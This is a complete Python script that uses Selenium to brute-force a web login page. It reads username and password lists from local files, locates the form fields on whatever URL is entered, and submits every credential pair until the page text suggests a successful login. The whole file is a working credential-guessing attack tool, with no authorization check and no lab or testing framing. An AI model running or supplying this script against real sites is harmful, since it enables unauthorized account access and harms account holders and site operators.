from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

# Function to load usernames from the file
def load_usernames(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            usernames = file.read().splitlines()
        return usernames
    except FileNotFoundError:
        print(f"Error: {filename} not found.")
        return []

# Function to load passwords from the file
def load_passwords(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            passwords = file.read().splitlines()
        return passwords
    except FileNotFoundError:
        print(f"Error: {filename} not found.")
        return []

# Function to detect login form and perform brute force attack
def brute_force_login(url):
    # Load usernames and passwords
    usernames = load_usernames('usernames.txt')
    passwords = load_passwords('passwords.txt')
    
    if not usernames or not passwords:
        print("Usernames or passwords file is empty. Exiting.")
        return

    # Initialize the WebDriver
    driver = webdriver.Chrome()  # Use webdriver.Firefox() if needed
    
    try:
        driver.get(url)
        print(f"Opened login page: {url}")

        # Find all form elements on the page
        forms = driver.find_elements(By.TAG_NAME, "form")
        if not forms:
            print("No forms found on the page. Exiting.")
            return
        
        print(f"Found {len(forms)} form(s). Checking for username and password fields.")
        
        # Check each form to find the username and password fields
        for form in forms:
            inputs = form.find_elements(By.TAG_NAME, "input")
            username_field = None
            password_field = None

            # Try to find the username and password fields
            for input_field in inputs:
                input_type = input_field.get_attribute("type")
                if input_type in ["text", "email"]:
                    username_field = input_field
                elif input_type == "password":
                    password_field = input_field

            # Ensure we have both fields before continuing
            if username_field and password_field:
                print("Username and password fields detected.")
                break
        else:
            print("No username/password fields detected. Exiting.")
            return

        # Start the brute force attack by iterating over usernames and passwords
        for username in usernames:
            for password in passwords:
                print(f"Attempting login with username: {username} and password: {password}")

                try:
                    # Re-locate elements before each attempt to avoid StaleElementReferenceException
                    username_field = driver.find_element(By.NAME, "username")  # Adjust the name if needed
                    password_field = driver.find_element(By.NAME, "password")  # Adjust the name if needed

                    # Fill the form fields with the credentials
                    username_field.clear()
                    password_field.clear()
                    username_field.send_keys(username)
                    password_field.send_keys(password)
                    password_field.send_keys(Keys.RETURN)  # Simulate pressing Enter key
                    
                    time.sleep(0.2)  # Wait for the page to load

                    # Check if login is successful (adjust this logic according to the page behavior)
                    if "welcome" in driver.page_source.lower() or "logged in" in driver.page_source.lower():
                        print("Brute force successful!")
                        return
                except Exception as e:
                    print(f"Error during login attempt: {e}")
                    continue
                
        print("Brute force failed. No valid credentials found.")

    finally:
        driver.quit()

# Main function
if __name__ == "__main__":
    login_url = input("Enter the URL of the login page: ").strip()
    brute_force_login(login_url)
